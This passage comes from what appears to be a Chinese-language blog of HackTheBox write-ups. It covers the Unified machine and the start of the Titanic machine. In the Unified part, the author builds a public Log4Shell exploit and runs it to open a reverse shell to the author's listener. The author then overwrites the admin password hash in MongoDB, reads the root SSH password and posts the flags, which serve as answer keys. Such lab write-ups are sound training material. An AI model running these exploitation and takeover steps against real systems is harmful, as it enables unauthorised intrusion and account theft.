class="hljs-string">SF:20Bad<span class="hljs-char escape_">\x20</span>Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-number">24</span>A,<span class="hljs-string">&quot;HTTP/1\.</span><br><span class="hljs-string">SF:1<span class="hljs-char escape_">\x20</span>404<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Lan</span><br><span class="hljs-string">SF:guage:<span class="hljs-char escape_">\x20</span>en<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>431<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar\x2</span><br><span class="hljs-string">SF:02025<span class="hljs-char escape_">\x20</span>11:39:22<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;!doctype<span class="hljs-char escape_">\x20</span>ht</span><br><span class="hljs-string">SF:ml&gt;&lt;html<span class="hljs-char escape_">\x20</span>lang=<span class="hljs-char escape_">\&quot;</span>en<span class="hljs-char escape_">\&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>404<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span>\</span><br><span class="hljs-string">SF:x93<span class="hljs-char escape_">\x20</span>Not<span class="hljs-char escape_">\x20</span>Found&lt;/title&gt;&lt;style<span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>text/css<span class="hljs-char escape_">\&quot;</span>&gt;body<span class="hljs-char escape_">\x20</span>&#123;font-fa</span><br><span class="hljs-string">SF:mily:Tahoma,Arial,sans-serif;&#125;<span class="hljs-char escape_">\x20</span>h1,<span class="hljs-char escape_">\x20</span>h2,<span class="hljs-char escape_">\x20</span>h3,<span class="hljs-char escape_">\x20</span>b<span class="hljs-char escape_">\x20</span>&#123;color:whit</span><br><span class="hljs-string">SF:e;background-color:#525D76;&#125;<span class="hljs-char escape_">\x20</span>h1<span class="hljs-char escape_">\x20</span>&#123;font-size:22px;&#125;<span class="hljs-char escape_">\x20</span>h2<span class="hljs-char escape_">\x20</span>&#123;font-</span><br><span class="hljs-string">SF:size:16px;&#125;<span class="hljs-char escape_">\x20</span>h3<span class="hljs-char escape_">\x20</span>&#123;font-size:14px;&#125;<span class="hljs-char escape_">\x20</span>p<span class="hljs-char escape_">\x20</span>&#123;font-size:12px;&#125;<span class="hljs-char escape_">\x20</span>a\x</span><br><span class="hljs-string">SF:20&#123;color:black;&#125;<span class="hljs-char escape_">\x20</span>\.line<span class="hljs-char escape_">\x20</span>&#123;height:1px;background-color:#525D76;bord</span><br><span class="hljs-string">SF:er:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>404<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span></span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Not<span class="hljs-char escape_">\x20</span>Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-number">24</span>E,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400\x2</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Language:<span class="hljs-char escape_">\x20</span>e</span><br><span class="hljs-string">SF:n<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>435<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>2025<span class="hljs-char escape_">\x20</span>11</span><br><span class="hljs-string">SF::39:24<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;!doctype<span class="hljs-char escape_">\x20</span>html&gt;&lt;html\x2</span><br><span class="hljs-string">SF:0lang=<span class="hljs-char escape_">\&quot;</span>en<span class="hljs-char escape_">\&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x20</span>Bad\</span><br><span class="hljs-string">SF:x20Request&lt;/title&gt;&lt;style<span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>text/css<span class="hljs-char escape_">\&quot;</span>&gt;body<span class="hljs-char escape_">\x20</span>&#123;font-family:Taho</span><br><span class="hljs-string">SF:ma,Arial,sans-serif;&#125;<span class="hljs-char escape_">\x20</span>h1,<span class="hljs-char escape_">\x20</span>h2,<span class="hljs-char escape_">\x20</span>h3,<span class="hljs-char escape_">\x20</span>b<span class="hljs-char escape_">\x20</span>&#123;color:white;backgro</span><br><span class="hljs-string">SF:und-color:#525D76;&#125;<span class="hljs-char escape_">\x20</span>h1<span class="hljs-char escape_">\x20</span>&#123;font-size:22px;&#125;<span class="hljs-char escape_">\x20</span>h2<span class="hljs-char escape_">\x20</span>&#123;font-size:16px</span><br><span class="hljs-string">SF:;&#125;<span class="hljs-char escape_">\x20</span>h3<span class="hljs-char escape_">\x20</span>&#123;font-size:14px;&#125;<span class="hljs-char escape_">\x20</span>p<span class="hljs-char escape_">\x20</span>&#123;font-size:12px;&#125;<span class="hljs-char escape_">\x20</span>a<span class="hljs-char escape_">\x20</span>&#123;color:</span><br><span class="hljs-string">SF:black;&#125;<span class="hljs-char escape_">\x20</span>\.line<span class="hljs-char escape_">\x20</span>&#123;height:1px;background-color:#525D76;border:none;&#125;</span><br><span class="hljs-string">SF:&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x20</span>Bad\x</span><br><span class="hljs-string">SF:20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br><span class="hljs-title class_">Service</span> <span class="hljs-title class_">Info</span>: <span class="hljs-variable">OS</span>: <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">CPE</span>: <span class="hljs-variable">cpe</span>:/<span class="hljs-variable">o</span>:<span class="hljs-variable">linux</span>:<span class="hljs-variable">linux_kernel</span><br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">227.57</span> <span class="hljs-variable">seconds</span><br></code></pre></td></tr></table></figure><p>nmap 扫</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which are <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> <span class="hljs-literal">four</span> <span class="hljs-built_in">open</span> ports?<br>:<span class="hljs-number">22</span>,<span class="hljs-number">6789</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8443</span><br></code></pre></td></tr></table></figure><h3 id="Task-2-8"><a href="#Task-2-8" class="headerlink" title="Task 2"></a>Task 2</h3><p>访问 8080 端口会重定向到 8443 ，然后</p><p><img src="https://img.dkdun.cn/v1/2025/12/d632171ab4bebf55.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> title <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> software <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">8443</span>?<br>:UniFi Network<br></code></pre></td></tr></table></figure><h3 id="Task-3-8"><a href="#Task-3-8" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> software <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>?<br>:<span class="hljs-number">6.4</span><span class="hljs-number">.54</span><br></code></pre></td></tr></table></figure><h3 id="Task-4-8"><a href="#Task-4-8" class="headerlink" title="Task 4"></a>Task 4</h3><p>直接搜 UniFi Network 6.4.54 CVE</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> is the <span class="hljs-title class_">CVE</span> <span class="hljs-keyword">for</span> the identified vulnerability?<br><span class="hljs-symbol">:CVE-</span><span class="hljs-number">2021</span><span class="hljs-number">-44228</span><br></code></pre></td></tr></table></figure><h3 id="Task-5-8"><a href="#Task-5-8" class="headerlink" title="Task 5"></a>Task 5</h3><p><a href="https://github.com/puzzlepeaches/Log4jUnifi">CVE-2021-44228</a></p><p><a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi">https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi</a></p><p>记得检查一下 java 环境（因为我就是忘记检查 Java 环境然后一直失败）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt update &amp;&amp; apt install openjdk-11-jre maven<br>git <span class="hljs-built_in">clone</span> --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi \ &amp;&amp; <span class="hljs-built_in">cd</span> Log4jUnifi &amp;&amp; pip3 install -r requirements.txt<br>mvn package -f utils/rogue-jndi/<br></code></pre></td></tr></table></figure><p>JNDI（Java Naming and Directory Interface）是一个应用程序设计的 API，一种标准的 Java 命名系统接口。如果程序定义了 JNDI 中的接口，那么就能通过接口的 API 去访问命令服务和目录服务。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What protocol <span class="hljs-keyword">does</span> JNDI leverage <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> injection?<br>:LDAP<br></code></pre></td></tr></table></figure><h3 id="Task-6-8"><a href="#Task-6-8" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What tool <span class="hljs-built_in">do</span> we use <span class="hljs-built_in">to</span> intercept <span class="hljs-keyword">the</span> traffic, indicating <span class="hljs-keyword">the</span> attack was successful?<br>:tcpdump<br></code></pre></td></tr></table></figure><h3 id="Task-7-8"><a href="#Task-7-8" class="headerlink" title="Task 7"></a>Task 7</h3><p>反弹 shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> exploit.py -u https://<span class="hljs-number">10.129.61.149:8443</span> -i <span class="hljs-number">10.10.16.45</span> -p <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ea65c75788022868.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">What<span class="hljs-built_in"> port </span><span class="hljs-keyword">do</span> we need <span class="hljs-keyword">to</span> inspect intercepted traffic <span class="hljs-keyword">for</span>?<br>:389<br></code></pre></td></tr></table></figure><h3 id="Task-8-5"><a href="#Task-8-5" class="headerlink" title="Task 8"></a>Task 8</h3><p><code>ps -aux</code> 查看进程，找到 <code>MongoDB</code> 的端口 <code>27117</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/29ecd50035aef4bf.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What port <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> MongoDB service <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span>?<br>:<span class="hljs-number">27117</span><br></code></pre></td></tr></table></figure><h3 id="Task-9-5"><a href="#Task-9-5" class="headerlink" title="Task 9"></a>Task 9</h3><p>连接 <code>MongoDB</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mongo</span> --port <span class="hljs-number">27117</span><br><span class="hljs-comment">#查看所有数据库</span><br><span class="hljs-attribute">show</span> dbs<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1d53e89ba85b7111.png"></p><p>默认为 <code>ace</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">default</span> <span class="hljs-keyword">database</span> <span class="hljs-type">name</span> <span class="hljs-keyword">for</span> UniFi applications?<br>:ace<br></code></pre></td></tr></table></figure><h3 id="Task-10-3"><a href="#Task-10-3" class="headerlink" title="Task 10"></a>Task 10</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">function</span> we use <span class="hljs-keyword">to</span> enumerate users <span class="hljs-keyword">within</span> the <span class="hljs-keyword">database</span> <span class="hljs-keyword">in</span> MongoDB?<br>:db.<span class="hljs-keyword">admin</span>.find()<br></code></pre></td></tr></table></figure><h3 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">function</span> we use <span class="hljs-keyword">to</span> <span class="hljs-keyword">update</span> users <span class="hljs-keyword">within</span> the <span class="hljs-keyword">database</span> <span class="hljs-keyword">in</span> MongoDB?<br>:db.<span class="hljs-keyword">admin</span>.<span class="hljs-keyword">update</span>()<br></code></pre></td></tr></table></figure><h3 id="Task-12"><a href="#Task-12" class="headerlink" title="Task 12"></a>Task 12</h3><p>指定端口号然后连接数据库，枚举用户信息以 json 格式打印</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mongo <span class="hljs-comment">--port 27117 ace</span><br>db.<span class="hljs-keyword">admin</span>.find().<span class="hljs-keyword">forEach</span>(printjson);<br></code></pre></td></tr></table></figure><p>部分内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;_id&quot;</span> <span class="hljs-punctuation">:</span> ObjectId(<span class="hljs-string">&quot;61ce278f46e0fb0012d47ee4&quot;</span>)<span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;name&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;administrator&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;email&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;administrator@unified.htb&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;x_shadow&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;time_created&quot;</span> <span class="hljs-punctuation">:</span> NumberLong(<span class="hljs-number">1640900495</span>)<span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;last_site_name&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;default&quot;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>用 hashid 查加密方式</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">┌──</span>(root㉿butt3rf1y)<span class="hljs-operator">-</span>[<span class="hljs-regexp">/HTB/</span><span class="hljs-type">Machine</span><span class="hljs-regexp">/Unified/</span> ]<br><span class="hljs-operator">└─</span># hashid &#x27;<span class="hljs-variable">$6</span><span class="hljs-variable">$Ry6Vdbse</span><span class="hljs-variable">$8</span>enMR5Znxoo.<span class="hljs-type">WfCMd</span><span class="hljs-regexp">/Xk65GwuQEPx1M.QP8/</span>qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&#x27;<br><span class="hljs-type">Analyzing</span> &#x27;<span class="hljs-variable">$6</span><span class="hljs-variable">$Ry6Vdbse</span><span class="hljs-variable">$8</span>enMR5Znxoo.<span class="hljs-type">WfCMd</span><span class="hljs-regexp">/Xk65GwuQEPx1M.QP8/</span>qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&#x27;<br>[<span class="hljs-operator">+</span>] <span class="hljs-type">SHA</span><span class="hljs-operator">-</span><span class="hljs-number">512</span> <span class="hljs-type">Crypt</span><br></code></pre></td></tr></table></figure><p>不好爆破</p><p>用 mkpasswd 创建一个密码，然后把 <code>x_shadow</code> 用 <code>db.admin.update()</code> 命令更新到数据库去</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">└─<span class="hljs-meta"># mkpasswd -m sha-512 admin</span><br>$6$FNM7rHlUpwRIziUu$StfsQybKkHHf9zZkIVQKhvmBD6ApJPzViW/C8EYVxFZlUrM8UHKwDYYLypajSW16dzK8gV9oX7IP5fSmeQSp71<br></code></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">db.<span class="hljs-literal">admin</span>.update(&#123;<span class="hljs-string">&quot;_id&quot;</span>:ObjectId(<span class="hljs-string">&quot;61ce278f46e0fb0012d47ee4&quot;</span>)&#125;,&#123;<span class="hljs-variable">$set</span>:&#123;<span class="hljs-string">&quot;x_shadow&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$6</span><span class="hljs-variable">$FNM7rHlUpwRIziUu</span><span class="hljs-variable">$StfsQybKkHHf9zZkIVQKhvmBD6ApJPzViW</span>/C8EYVxFZlUrM8UHKwDYYLypajSW16dzK8gV9oX7IP5fSmeQSp71&quot;</span>&#125;&#125;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>使用 <code>administrator:admin</code> 登录进去，在 <code>SETTING/Site/Device Authentication</code> 找到 ssh 的密码 <code>root:NotACrackablePassword4U2022</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/84aed9d92c91868e.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> the root <span class="hljs-keyword">user</span>?<br>:NotACrackablePassword4U2022<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-11"><a href="#Submit-Flag-11" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p><code>/home/michael</code> 的 user.txt</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:<span class="hljs-number">6</span>ced1a6a89e666c0620cdb10262ba127<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-12"><a href="#Submit-Flag-12" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>ssh 连进去就是 root 了</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Submit root flag<br>:e<span class="hljs-number">50</span>bc<span class="hljs-number">93</span><span class="hljs-keyword">c</span><span class="hljs-number">75</span>b<span class="hljs-number">634e4</span>b<span class="hljs-number">272</span>d<span class="hljs-number">2</span>f<span class="hljs-number">771</span><span class="hljs-keyword">c</span><span class="hljs-number">33681</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Titanic</title>
    <link href="/2025/03/04/Titanic/"/>
    <url>/2025/03/04/Titanic/</url>
    
    <content type="html"><![CDATA[<p>寒假赛季打的机器了，唉，拖了这么久才想起发出来（太懒了wwwww），感谢 z3n1th、SWDD、n0o0b 师傅们的帮助www</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap 扫一下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">55</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">20</span>:<span class="hljs-number">15</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">55</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">37</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">10</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">52</span><br>Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">12</span>.<span class="hljs-number">58</span> seconds<br><br></code></pre></td></tr></table></figure><p>开放了 80 和 22</p><h1 id="UserFlag"><a href="#UserFlag" class="headerlink" title="UserFlag"></a>UserFlag</h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://titanic.htb/ -H  &quot;Host:FUZZ.titanic.htb&quot; -fc <span class="hljs-number">301</span><br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/]<br>└─# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://titanic.htb/ -H  &quot;Host:FUZZ.titanic.htb&quot; -fc <span class="hljs-number">301</span><br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\<br>       /\ \__/ /\ \__/  __  __  /\ \__/<br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\<br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/<br>         \ \_\   \ \_\  \ \____/  \ \_\<br>          \/_/    \/_/   \/___/    \/_/<br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://titanic.htb/<br> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt<br> :: Header           : Host: FUZZ.titanic.htb<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: Filter           : Response status: <span class="hljs-number">301</span><br>________________________________________________<br><br>dev                     [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">13982</span>, Words: <span class="hljs-number">1107</span>, Lines: <span class="hljs-number">276</span>, Duration: <span class="hljs-number">710</span>ms]<br>:: Progress: [<span class="hljs-number">114441</span>/<span class="hljs-number">114441</span>] :: Job [<span class="hljs-number">1</span>/<span class="hljs-number">1</span>] :: <span class="hljs-number">80</span> req/sec :: Duration: [<span class="hljs-number">0</span>:<span class="hljs-number">20</span>:<span class="hljs-number">50</span>] :: Errors: <span class="hljs-number">0</span> ::<br><br></code></pre></td></tr></table></figure><p>把 <code>dev.titanic.htb</code> 加到 <code>/etc/hosts</code> 里面然后访问</p><p><img src="https://img.dkdun.cn/v1/2025/12/af3ec6ee5d882d00.png"></p><p>发现了 gitea，然后点击 <code>Explore</code>  找到了一些用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/20552900753fbe8f.png"></p><p>只有 <code>developer</code> 用户里有文件，一个 <code>docker-config</code> 和一个 <code>flask-app</code></p><p><img 